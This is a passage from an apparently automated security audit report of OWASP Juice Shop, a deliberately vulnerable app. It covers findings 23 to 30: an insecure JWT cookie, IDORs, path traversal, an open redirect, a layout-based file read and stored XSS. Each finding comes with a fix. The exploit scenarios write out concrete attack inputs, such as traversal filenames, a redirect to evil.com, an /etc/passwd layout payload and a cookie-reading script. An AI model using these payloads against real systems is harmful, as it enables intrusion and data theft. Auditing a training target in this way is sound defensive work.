**Verdict:** TRUE_POSITIVE (confidence: 9/10) — PATCH /rest/products/reviews requires only authentication, then updates by attacker-supplied `_id` with no ownership check; any user can overwrite others' reviews (confirmed by the forgedReviewChallenge logic).

The finding is confirmed. Let me verify the facts:

- **Route registration** (server.ts:589): `app.patch('/rest/products/reviews', security.isAuthorized(), updateProductReviews())` — network-reachable, requires *any* valid JWT (`isAuthorized` is just `expressJwt`).
- **Sink** (updateProductReviews.ts:13-16): The Mongo update filters solely on `{ _id: req.body.id }` taken from the request body and sets `message` to `req.body.message`. `user` is read at line 12 but **never used in the filter or as an authorization gate**.
- **No upstream defence**: The only control in front is authentication, not authorization. No ownership comparison anywhere before the mutation.
- **Confirmation of intent**: Line 20 `forgedReviewChallenge` explicitly rewards the case `result.original[0].author !== user.data.email` — the code itself acknowledges a caller editing a review they don't own. This is an intentional Juice Shop challenge, but the finding accurately describes a real broken-access-control / IDOR: any authenticated user can overwrite any other user's review by enumerating/knowing the `_id`. The response (`res.json(result)`) also returns `original`, leaking the victim's review document.

This is a genuine, externally reachable authorization flaw with no neutralizing control. Per the decision rule: external entry point reached (B), no defence closes it (C/D), real impact (B). It is "working as designed" only in the sense of being a planted vuln — the bug class is real and exploitable, so it is a TRUE_POSITIVE.

Impact: any authenticated low-priv user can tamper with arbitrary users' review content (integrity), plus minor disclosure of the original doc in the response. Availability unaffected.

### 23. [HIGH] JWT session token set in cookie without HttpOnly/Secure flags
**Class:** CWE-1004
**CWE:** CWE-1004 - https://cwe.mitre.org/data/definitions/1004.html
**File:** `routes/updateUserProfile.ts:37-37`
**CVSS 3.1:** **7.4** (High) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
On a successful profile update the handler calls security.authorize(userWithStatus) to issue a new JWT and then res.cookie('token', updatedToken) with no options object. Express therefore sets the cookie without HttpOnly and without Secure. The token is the bearer credential consulted on line 13 (security.authenticatedUsers.get(req.cookies.token)); exposing it to client-side JavaScript or to cleartext transport allows an attacker to replay it and impersonate the user.

#### Impact
The freshly minted authentication JWT is written to the browser as a cookie with no HttpOnly or Secure attribute, so any script running in the page (e.g. via the stored-XSS username sink below) or any plaintext HTTP hop can read or capture it, enabling full session hijack of the affected user.

#### Exploit scenario
An attacker who lands script in the victim's profile page (the username field updated on line 33 is reflected unsanitized) reads document.cookie, exfiltrates the 'token' JWT, and presents it as their own session cookie to fully take over the victim's account.

#### Preconditions
- Victim is authenticated and updates their profile
- Attacker has an XSS foothold or can observe a non-TLS request

```
res.cookie('token', updatedToken)
```

#### How to fix
Set the auth cookie with HttpOnly and Secure (and SameSite) at line 37, e.g. res.cookie('token', updatedToken, { httpOnly: true, secure: true, sameSite: 'strict' }), so the JWT is never exposed to script or cleartext.

**Exploitability:** Token cookie lacks HttpOnly/Secure; only exploitable when paired with an XSS sink — downranked from CVSS 8.1 for dependency. Key enabler of XSS->session-theft chains.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — session JWT cookie set without HttpOnly/Secure on an auth-reachable route; no flags set anywhere, exploitable via the app's XSS/cleartext surface for token theft → account takeover

**Investigation**

**A. Cited line (verified).** `routes/updateUserProfile.ts:37` reads exactly `res.cookie('token', updatedToken)` — no options object. Express therefore sets the cookie with **no `HttpOnly` and no `Secure`** flag (Express defaults both to false). The scanner read the sink, file, and class correctly.

**B. Call chain to external entry.** `updateUserProfile()` is wired at `server.ts:612` → `app.post('/profile', updateUserProfile())`. This is a network-reachable route. It is gated by an auth check (line 13: `security.authenticatedUsers.get(req.cookies.token)`), so the entry point is **authenticated but external** (any logged-in user). The token written is a freshly-issued JWT (`security.authorize`, line 35) — the bearer credential the whole app consults.

**C. Hunt for a defence.**
- No flags are added anywhere — confirmed the same insecure pattern at `lib/insecurity.ts:187` (`updateAuthenticatedUsers`) and the login flow, so this is the app-wide cookie convention, not an isolated miss. No middleware re-sets the cookie with secure options.
- The app genuinely has reflected/stored XSS challenges and runs over HTTP in default deploys, so the preconditions (script foothold / cleartext transport) are realistically reachable — not purely hypothetical.

**D. Probing the "real impact" angle.** One caveat: Juice Shop's SPA also carries the JWT in `localStorage` / `Authorization` header (`utils.jwtFrom`), so the token is already exposed to client JS by design — meaning `HttpOnly` alone wouldn't fully protect this particular credential. However, the **missing `Secure` flag** is still a genuine, independent weakness (token transmitted over cleartext is interceptable), and missing `HttpOnly` on a session-token cookie is a standard, correctly-classified info-leak (CWE-1004/CWE-614). The scanner did not mis-read the sink or class.

**Conclusion**

The finding is accurate: an authenticated network route writes the session JWT to a cookie with neither `HttpOnly` nor `Secure`, no upstream control closes it, and the app's actual XSS/cleartext surface makes the exposure real rather than theoretical. Impact requires a secondary condition (XSS foothold or forced cleartext), which raises attack complexity but does not negate it.

### 24. [HIGH] Unauthenticated order tracking by arbitrary order id
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `server.ts:570-570`
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)
**Also at:** `routes/trackOrder.ts:9-25`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
Line 570 `app.get('/rest/track-order/:id', trackOrder())` is registered with no isAuthorized/appendUserId/owner check. In trackOrder() (routes/trackOrder.ts:9-25) the path variable id is interpolated into `db.ordersCollection.find({ $where: "this.orderId === '${id}'" })` and the matching order is returned. There is no comparison of the order's owner against any session, and no session is even required. The attacker-controlled :id reaches the order query directly.

#### Impact
The /rest/track-order/:id route has no authentication or ownership middleware at all. An anonymous attacker can pass any order id and retrieve that order's details, allowing enumeration/leakage of other customers' orders.

#### Exploit scenario
Without logging in, an attacker requests `GET /rest/track-order/<someOrderId>` and receives another customer's order document; by varying/injecting the id they can enumerate orders.

#### Preconditions
- None — endpoint is reachable anonymously

```
app.get('/rest/track-order/:id', trackOrder())
```

#### How to fix
Require authentication and scope the order lookup to the caller's own orders (match order.email/UserId to the session) before returning data on /rest/track-order/:id.

**Exploitability:** Unauthenticated order tracking by arbitrary id with no owner check (and is the [9] injection sink). Bulk order data exposure. CVSS 7.5 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — anonymous `/rest/track-order/:id` reaches `$where` order query with no auth/owner check; arbitrary order disclosure + NoSQL injection

Confirmed against source.

**A. Sink:** `routes/trackOrder.ts:15` interpolates `id` directly into `db.ordersCollection.find({ $where: \`this.orderId === '${id}'\` })`. No owner/session comparison.

**B. Entry point:** `server.ts:570` `app.get('/rest/track-order/:id', trackOrder())` — registered with **no** `security.isAuthorized()`, `appendUserId()`, or ownership middleware (contrast adjacent lines 573, 577–579 which do gate). Network-reachable, anonymous. External entry point reached.

**C. Defences probed:** Line 12 applies a filter — `String(req.params.id).replace(/[^\w-]+/g, '')` strips injection chars *only when* `reflectedXssChallenge` is disabled. When the challenge is enabled (default in this intentionally-vulnerable app), it instead does `utils.trunc(id, 60)`, leaving `$where` JS-injection chars intact (the planted `noSqlOrdersChallenge`). Even with the strict filter, the IDOR remains: any anonymous caller can pass an arbitrary `orderId` and receive another customer's order document — no auth, no ownership check. No upstream gate closes this.

**D.** No allow-list, auth, or feature flag fully neutralizes the path. This is a deliberately planted vuln (NoSQL `$where` injection + unauthenticated order disclosure), and per scope rules intentional planted vulns in this app are still scored as real reachable issues. Impact is genuine data exposure of other users' orders.

The scanner read the code correctly: right file, right sink, right class (unauthenticated order disclosure / NoSQL injection), reachable from an anonymous network entry point with no defence.

### 25. [HIGH] Temp file path built from attacker-controlled upload filename
**Class:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) - https://cwe.mitre.org/data/definitions/22.html
**File:** `routes/fileUpload.ts:28-32`
**CVSS 3.1:** **8.2** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
file.originalname (set by the uploading client in the multipart part) is lowercased and passed to path.join(os.tmpdir(), filename) on line 29. path.join normalizes embedded '../' sequences, so an originalname like '../../var/www/app/x.zip' produces a tempFile path outside tmpdir, which is then opened for writing and filled with the attacker buffer (lines 30-32).

#### Impact
The uploaded file's originalname is joined to os.tmpdir() with no traversal check, so a filename containing '../' segments lets an attacker write the uploaded buffer outside the temp directory as the service account.

#### Exploit scenario
Attacker uploads a .zip whose multipart filename field is '../../../tmp/../etc/cron.d/evil.zip'; path.join collapses the traversal and fs.open writes the attacker-controlled buffer to the resolved location with the privileges of the Node process.

#### Preconditions
- fileWriteChallenge enabled
- process account has write permission to the target path

```
const filename = file.originalname.toLowerCase()
const tempFile = path.join(os.tmpdir(), filename)
fs.open(tempFile, 'w', function (err, fd) {
```

#### How to fix
Sanitize the filename with path.basename() before joining, and confirm the final tempFile resolves under os.tmpdir(), at routes/fileUpload.ts:28-29.

**Exploitability:** Unauth upload filename traversal (path.join normalizes ../) writes attacker buffer outside tmpdir → arbitrary file write feeding RCE. CVSS 8.2 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — unauth POST /file-upload feeds unsanitized multer originalname into path.join+fs.write; traversal collapses out of tmpdir, only constrained by a .zip/lowercase filter that does not block traversal.

**Investigation summary**

**A. The sink (lines 27–32) is exactly as reported.** `file.originalname.toLowerCase()` → `path.join(os.tmpdir(), filename)` → `fs.open(tempFile, 'w')` + `fs.write(buffer)`. `path.join` collapses `../` sequences, so a crafted `originalname` writes the uploaded buffer outside `os.tmpdir()`.

**B. Call chain reaches an unauthenticated external entry point.** `server.ts:283`:
```
app.post('/file-upload', uploadToMemory.single('file'), ensureFileIsPassed, ... checkFileType, handleZipFileUpload, ...)
```
No `security.isAuthorized()` / `denyAll` middleware in the chain → **UNAUTH-reachable**. `uploadToMemory` is `multer.memoryStorage()` (server.ts:627), and multer 1.4.5 / busboy 1.6.0 copy the raw multipart filename header into `file.originalname` **without stripping path components**. So the value is fully attacker-controlled and reaches the sink unmodified.

**C. Searched for defences — none close the traversal:**
- `utils.endsWith(originalname, '.zip')` (line 25) — only constrains the **extension**, not traversal; `../../var/www/x.zip` passes.
- `.toLowerCase()` — limits the target to lowercase paths, a constraint but not a defence.
- `isChallengeEnabled(fileWriteChallenge)` (line 26) — in Juice Shop's normal deployment challenges are enabled by default.
- The Zip-Slip `absolutePath.includes(path.resolve('.'))` check on line 41 guards the **unzip entry write** (`uploads/complaints/`), not the `tempFile` write — different sink. It does **not** validate `tempFile`.

**D. Probing the residual constraints:** the only real limiters are "must end in `.zip`" and "must be lowercase." These reduce the file *names* writable but still permit writing attacker-controlled bytes to an arbitrary directory on the host (overwrite existing `.zip` artifacts, drop into watched/processed dirs) with the Node process's privileges. That is a genuine arbitrary-file-write primitive, not a hypothetical.

The scanner read the code correctly (right file, right sink, right class). External unauth entry confirmed; no upstream control neutralises the input. Impact is real (integrity), bounded by the `.zip`/lowercase constraints (so not trivially RCE, no read primitive → C:N).

### 26. [MEDIUM] Path traversal in key file server via backslash bypass
**Class:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) - https://cwe.mitre.org/data/definitions/22.html
**File:** `routes/keyServer.ts:8-15`
**CVSS 3.1:** **5.9** (Medium) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
serveKeyFiles() takes the route parameter params.file (attacker-controlled, no auth) and passes it directly into path.resolve('encryptionkeys/', file) which is served via res.sendFile. The only guard is `!file.includes('/')`, which rejects forward slashes but not backslashes ('\') nor URL-encoded separators interpreted by path.resolve. On Windows, path.resolve treats '\' as a separator, so a value like '..\..\package.json' resolves above the intended directory. The check is a denylist of a single character rather than an allow-list of safe filenames, so it fails to constrain the file argument to the intended directory.

#### Impact
An unauthenticated attacker can read files outside the encryptionkeys/ directory. On Windows hosts the forward-slash-only filter is trivially bypassed with backslashes, allowing disclosure of arbitrary application files (source, config, secrets).

#### Exploit scenario
Attacker requests GET /encryptionkeys/..\..\package.json (or a sequence of backslash '..' segments) against a Windows-hosted instance. The forward-slash check passes because the string contains no '/', and path.resolve joins the backslash-traversal path, escaping encryptionkeys/. res.sendFile returns the contents of the targeted file outside the key directory.

#### Preconditions
- Server runs on a platform where path.resolve treats backslash as a separator (Windows), or filename allows reaching unintended in-dir files
- Route /encryptionkeys/:file is registered and reachable without authentication

```
const file = params.file

if (!file.includes('/')) {
  res.sendFile(path.resolve('encryptionkeys/', file))
} else {
  res.status(403)
  next(new Error('File names cannot contain forward slashes!'))
}
```

#### How to fix
Replace the single-character denylist with an allow-list: validate that path.basename(file) === file and that the resolved absolute path still begins with the resolved encryptionkeys/ directory before calling res.sendFile. Reject any name containing path separators of any kind ('/', '\\') or '..'.

**Exploitability:** Traversal relies on backslash being a separator — only effective on Windows; the shipped distroless Docker image is Linux where this is inert. AC:H, CVSS 5.9.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — Unauth `/encryptionkeys/:file` passes attacker `..\` through a `/`-only denylist; on Windows `path.resolve` treats `\` as a separator and escapes the directory for arbitrary file read. POSIX hosts are unaffected, so impact is platform-conditional.

Verified. Key findings:

- `routes/keyServer.ts:8-15` matches the snippet exactly: `params.file` → guard `!file.includes('/')` → `res.sendFile(path.resolve('encryptionkeys/', file))`.
- `server.ts:257`: `app.use('/encryptionkeys/:file', serveKeyFiles())` — registered with **no auth middleware** in front (line 256/257 are bare `app.use`, no `isAuthorized`/`denyAll`). Unauth-reachable confirmed.

Analysis of the finding:

**(A) What the code does:** Serves any filename under `encryptionkeys/` via `sendFile(path.resolve(...))`. Express's `:file` segment captures everything up to the next `/`; backslashes are captured into `params.file`.

**(B) Entry point:** Network, unauthenticated GET `/encryptionkeys/<file>`. External entry reached.

**(C/D) Defences:** The only guard is a single-character denylist of `/`. URL-decoding happens before the check, but `..%5c` decodes to `..\` which contains no forward slash → passes. On POSIX, `path.resolve('encryptionkeys/', '..\\..\\package.json')` treats `\` as a literal filename character → resolves to a non-existent file → no traversal. On **Windows (win32 semantics)**, `path.resolve` treats `\` as a separator → `..\..\package.json` escapes the directory; `path.resolve` normalizes away the `..`, yielding a clean absolute path outside the dir, which `sendFile` happily serves. The denylist does not constrain backslash, encoded separators, or use an allow-list — so the defence does not close the path on Windows.

This is a real, reachable path traversal with a confidentiality impact (arbitrary file read), gated on the host OS being Windows. Juice Shop is officially deployable on Windows, so the precondition is realistic but not universal — hence elevated attack complexity (depends on host platform) and capped confidence. Not a scope exclusion: it is server-side, reaches a real filesystem boundary (not a flat keyspace), and is unauthenticated.

### 27. [MEDIUM] Open redirect via weak substring allowlist on ?to
**Class:** CWE-601: URL Redirection to Untrusted Site (Open Redirect)
**CWE:** CWE-601: URL Redirection to Untrusted Site (Open Redirect) - https://cwe.mitre.org/data/definitions/601.html
**File:** `routes/redirect.ts:12-16`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)
**Also at:** `lib/insecurity.ts:128-134`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
performRedirect reads the fully attacker-controlled query parameter `to` (line 12, no auth required on the redirect route) and passes it straight into res.redirect (line 16). The only gate is security.isRedirectAllowed(toUrl). In Juice Shop that function tests whether the allowlisted URLs appear ANYWHERE in toUrl (substring containment), not whether toUrl is anchored to/starts with an allowed origin. The local isUnintendedRedirect helper confirms the intended semantics is startsWith, but the actual gate is the weaker contains-check, so any URL that merely embeds an allowlisted string as a substring (typically in the query string) satisfies the check.

#### Impact
An unauthenticated attacker crafts a URL on the trusted Juice Shop host that 302-redirects victims to an attacker-controlled site. Used for phishing/credential theft and OAuth-token leakage because the redirect appears to originate from the legitimate domain.

#### Exploit scenario
Attacker sends a victim the link https://juice-shop.example/redirect?to=https://evil.com/?pwn=https://github.com/bkimminich/juice-shop . isRedirectAllowed returns true because the trusted GitHub URL appears as a substring, and res.redirect sends the victim's browser to https://evil.com. The victim sees a redirect that began on the trusted domain, enabling phishing or theft of any tokens carried in the request.

#### Preconditions
- Redirect route reachable without authentication (it is, no isAuthorized guard)
- isRedirectAllowed uses substring/contains matching rather than origin anchoring

```
const toUrl: string = query.to as string
if (security.isRedirectAllowed(toUrl)) {
  ...
  res.redirect(toUrl)
}
```

#### How to fix
Validate that toUrl's parsed origin exactly equals an allowlisted origin (parse with new URL() and compare url.origin against an allow-set) before calling res.redirect at line 16; do not rely on substring containment. Reject any value whose scheme is not http/https.

**Exploitability:** Open redirect via substring allowlist; phishing pivot only, needs user interaction. CVSS 6.1 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unauthenticated `/redirect?to=` flows to `res.redirect` behind a substring `includes` allowlist that is trivially bypassed (`?to=https://evil.com/?x=<allowlisted>`), confirmed in insecurity.ts and project tests.

Verified against source:

- **routes/redirect.ts:12-16** — `toUrl` is read directly from `query.to`, gated only by `security.isRedirectAllowed(toUrl)`, then passed to `res.redirect(toUrl)`. Confirmed.
- **lib/insecurity.ts:128-134** — `isRedirectAllowed` uses `url.includes(allowedUrl)` (substring containment), NOT `startsWith`/origin anchoring. Confirmed weak gate.
- **isUnintendedRedirect** (line 24-30) uses `utils.startsWith` — confirming the *intended* semantics is prefix-anchoring, while the real gate is the weaker `includes`.
- **server.ts:606** — `app.get('/redirect', performRedirect())` registered with no `isAuthorized`/auth middleware → unauthenticated network reachable.
- Test corroboration: `test/api/redirectSpec.ts:73` and `test/cypress/e2e/redirect.spec.ts:14` exercise exactly the bypass (`?to=https://owasp.org?trickIndexOf=https://github.com/juice-shop/juice-shop`), proving the substring bypass works in practice.

Tried to kill it (step C/D): no auth gate, no anchoring, no URL parsing/normalization, no host check — the `includes` check is fully bypassable by embedding an allowlisted string in the query of an attacker-controlled host. Reachable unauthenticated. The attacker steers the full host+scheme (not path-only), so the "WRONG LAYER / path-only SSRF" exclusions don't apply. This is server-side enforcement (Express route), correct layer. It is an intentional Juice Shop challenge, but it is a genuine, exploitable open redirect — that satisfies TRUE_POSITIVE under the decision rule.

Impact: classic open redirect — phishing / referrer-token leakage, crosses origin boundary, requires victim to click (UI:R). No direct integrity/availability of the app server; limited confidentiality.

### 28. [MEDIUM] Local file read via attacker-controlled render layout
**Class:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) - https://cwe.mitre.org/data/definitions/22.html
**File:** `routes/dataErasure.ts:65-79`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The POST '/' handler accepts a JSON body typed as DataErasureRequestParams which includes a `layout` field. When `req.body.layout` is present, the code computes `path.resolve(req.body.layout)` only to run a substring blocklist (ftp, ctf.key, encryptionkeys). It then calls `res.render('dataErasureResult', { ...req.body }, cb)` — spreading the entire request body, including `layout`, into the render options. The EJS/express render engine treats the `layout` property as a file path to include/render, so an attacker-controlled path (e.g. ../../../../etc/passwd) is read from disk and the first 100 chars are returned in the response. The blocklist only rejects three substrings, so any other absolute or traversal path is permitted.

#### Impact
Any authenticated user can read arbitrary files on the server filesystem by supplying a crafted `layout` value, since it is spread into the view render context and interpreted by the template engine as a layout file to include. This leaks application source, configuration, and secrets outside the web root.

#### Exploit scenario
An authenticated attacker sends POST /dataerasure with body {"email":"x","securityAnswer":"x","layout":"../../../../etc/passwd"}. The path does not contain ftp/ctf.key/encryptionkeys, so isForbiddenFile is false. res.render passes layout into the template engine, which reads /etc/passwd and returns the first 100 bytes via res.send, leaking server file contents.

#### Preconditions
- Attacker holds a valid authenticated session token cookie
- Target file path does not contain the blocked substrings ftp/ctf.key/encryptionkeys

```
if (req.body.layout) {
  const filePath: string = path.resolve(req.body.layout).toLowerCase()
  const isForbiddenFile: boolean = (filePath.includes('ftp') || filePath.includes('ctf.key') || filePath.includes('encryptionkeys'))
  if (!isForbiddenFile) {
    res.render('dataErasureResult', {
      ...req.body
    }, (error, html) => { ... })
```

#### How to fix
Do not spread untrusted request body into res.render options. Remove `layout` from the render context (omit it from the spread) or validate it against a strict allow-list of known template names rather than a substring denylist.

**Exploitability:** Post-auth render-layout LFI; weak 3-substring blocklist allows traversal to arbitrary files (first 100 chars returned). CVSS 7.1 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — authenticated attacker controls `layout` spread into `res.render`; hbs reads the path off disk and returns file contents. Intentional LFR sink; only the scanner's exact `/etc/passwd` payload is off (`.hbs` auto-appended), but extensioned-path traversal works.

**Analysis**

**A. The sink (routes/dataErasure.ts:65–79)** — Confirmed exactly as reported. The POST `/` handler, after an auth check, spreads the entire `req.body` (including `layout`) into `res.render('dataErasureResult', { ...req.body }, cb)`. The only guard is `path.resolve(layout).toLowerCase()` substring-blocking `ftp`, `ctf.key`, `encryptionkeys`. The callback slices `html.slice(0,100)` back to the client and solves `lfrChallenge` — confirming this is the **intentional Local File Read challenge**, not an accidental bug.

**B. Call chain / entry point** — `server.ts:604` mounts the router at `/dataerasure` (network-reachable). The handler gates on `security.authenticatedUsers.get(req.cookies.token)` (any valid session). Juice Shop allows open self-registration, so this is reachable by any authenticated low-priv user. External entry point confirmed.

**C. Defences probed** — The substring blocklist is the only control. It blocks just three tokens; arbitrary traversal paths (`../../../../`) sail through.

**D. Engine behaviour verified** — `node_modules/hbs/lib/hbs.js:131–207`: `options.layout` is taken straight from locals, joined via `path.join(view_dir, layout)`, then `fs.readFile`'d and returned as `locals.body`. So `layout` genuinely is an attacker-controlled file path read from disk → returned in the response.

**One scanner inaccuracy:** at line 151, if the resolved path has *no* extension, hbs appends `.hbs`. So the literal `/etc/passwd` payload becomes `/etc/passwd.hbs` and fails. However, any path **with** an extension (e.g. `../../../package.json`, `.md`, `.pdf`, source files) is read verbatim — the LFR class is real and exploitable; only the specific example payload is imperfect. The core claim (attacker-controlled `layout` → server file content disclosed) holds.

Impact is confined to confidentiality (first ~100 chars of readable, extensioned files; the three most-sensitive tokens are blocked), no integrity/availability impact.

### 29. [MEDIUM] Unescaped username injected into compiled Pug template (stored XSS)
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `routes/userProfile.ts:70-95`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)
**Also at:** `views/userProfile.pug:44`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
After the eval/escaping logic, username is placed into the template via template.replace(/_username_/g, username) at line 71, then the whole template string is passed to pug.compile and rendered at lines 84/95. When the username contains markup (e.g. via the eval branch returning '<script>alert(`xss`)</script>'), it is emitted into HTML without context-aware encoding, producing stored XSS. The CSP set at line 85 still permits 'unsafe-eval' and is itself partly built from user-controlled profileImage.

#### Impact
An authenticated user's stored username (or the result of the eval branch) is substituted into the Pug template and compiled, allowing stored HTML/script injection into the rendered profile page served to the victim's browser.

#### Exploit scenario
Attacker sets username to a payload that produces <script>alert(document.cookie)</script> in the rendered template, then loads /profile; the script executes in the browser session under the application origin.

#### Preconditions
- Attacker has an authenticated session
- usernameXssChallenge enabled so the escaping fallback is bypassed

```
if (username) {
  template = template.replace(/_username_/g, username)
}
...
const fn = pug.compile(template)
res.send(fn(user))
```

#### How to fix
HTML-encode username with entities.encode before template.replace at routes/userProfile.ts:71, and build the Pug template with proper escaping rather than raw string substitution.

**Exploitability:** Stored XSS via Pug template username; needs eval branch and victim view. CVSS 5.4 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — username from POST /profile is stored unsanitized and substituted into pug *source* before compile/render; eval branch injects raw markup, no encoding closes the path. Reachable via authenticated /profile route.

I have verified the finding against the actual source. My analysis:

**A. What the code really does (verified):**
- Line 26: reads `views/userProfile.pug` as a raw string.
- Line 50: `username = user.username` (the stored DB value).
- Lines 52–65: if username matches `#{(.*)}` **and** `usernameXssChallenge` is enabled, it `eval()`s the inner code and assigns the result back to `username`. Otherwise it prefixes `\` (the escaping fallback that neutralizes pug interpolation).
- Line 71: `template.replace(/_username_/g, username)` — this substitutes username into the **pug source text** (the `_username_` token on line 44 of the .pug file) *before* compilation. This is raw source injection, not a runtime variable, so pug's auto-escaping never applies to it.
- Lines 84/95: `pug.compile(template)` then `res.send(fn(user))` renders the attacker-influenced template.

**B. Call chain to external entry point (verified):**
- `getUserProfile()` → `server.ts:611` `app.get('/profile', security.updateAuthenticatedUsers(), getUserProfile())` — network-reachable.
- The username source: `updateUserProfile()` at `server.ts:612` `app.post('/profile', ...)` stores `req.body.username` **with zero sanitization** (`user.update({ username: req.body.username })`). Fully attacker-controlled, stored, then rendered. External entry point confirmed.

**C. Attempted to kill it:**
- The `\`-prefix on lines 61/64 is the only escaping. It is bypassed exactly when the username matches `#{...}` and the challenge flag is on — the documented precondition. In that branch the `eval()` result is injected raw into pug source. No context-aware encoding, no allow-list, no length/type constraint on `req.body.username`.
- Auth gate exists (must be a logged-in user), which lowers PR but does not close the path.

**Caveats lowering confidence/severity:** The rendered username is the *viewer's own* stored username (`findByPk(loggedInUser.data.id)`), so the rendered `/profile` is self-served — practically self-XSS for the HTML path, and the full `usernameXssChallenge` additionally requires the attacker to set a `profileImage` CSP containing `unsafe-inline` (the `solveIf` on line 88 confirms this). The same sink is also a server-side `eval` SSTI, but the finding is scoped to XSS. The scanner correctly identified the sink, file, line, and class — it did not misread the code, and an external, lower-or-equal-privileged entry point reaches it with no neutralizing control. This is a genuine (intentionally planted) vulnerability.

### 30. [MEDIUM] Basket IDOR: any logged-in user reads/checks out arbitrary basket
**Class:** CWE-639: Authorization Bypass Through User-Controlled Key
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key - https://cwe.mitre.org/data/definitions/639.html
**File:** `server.ts:365-366`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)
**Also at:** `routes/basket.ts:12-32`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
Line 365 `app.use('/rest/basket/:id', security.isAuthorized())` and line 366 `app.use('/rest/basket/:id/order', security.isAuthorized())` only assert that the requester is logged in. Line 556 `app.get('/rest/basket/:id', retrieveBasket())` then loads the basket purely by the request path variable. The login middleware never compares :id to the caller's own basket id (the bid stored at login time in security.authenticatedUsers). The attacker-controlled :id flows straight into the basket lookup with no tenant/owner scope.

#### Impact
The /rest/basket/:id route is guarded only by security.isAuthorized() (login). The :id is taken from the URL and used by retrieveBasket() to load the basket without verifying the basket belongs to the caller, so any authenticated user can view another user's basket contents and (via the sibling /rest/basket/:id/order path) act on it.

#### Exploit scenario
A logged-in customer iterates `GET /rest/basket/1`, `/rest/basket/2`, ... with their own Bearer token and reads other customers' basket contents, since ownership of the basket id is never checked.

#### Preconditions
- Attacker holds any valid (low-privilege) session token

```
app.use('/rest/basket/:id', security.isAuthorized())
  app.use('/rest/basket/:id/order', security.isAuthorized())
  ...
  app.get('/rest/basket/:id', retrieveBasket())
```

#### How to fix
Enforce that the :id equals the caller's own basket id (security.authenticatedUsers.from(req).bid) before serving; add this check in retrieveBasket or in a dedicated middleware on /rest/basket/:id instead of relying on isAuthorized alone.

**Exploitability:** Basket IDOR; any logged-in user reads arbitrary basket by id. Scoped data. CVSS 6.5 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — `/rest/basket/:id` is gated only by JWT validity; `retrieveBasket` loads by path-param id with no owner check, and the in-code `basketAccessChallenge.solveIf` confirms cross-user read is reachable/undefended.

Confirmed. Investigation complete:

- **A.** `server.ts:365-366` apply only `security.isAuthorized()` to `/rest/basket/:id`; line 556 routes to `retrieveBasket()`.
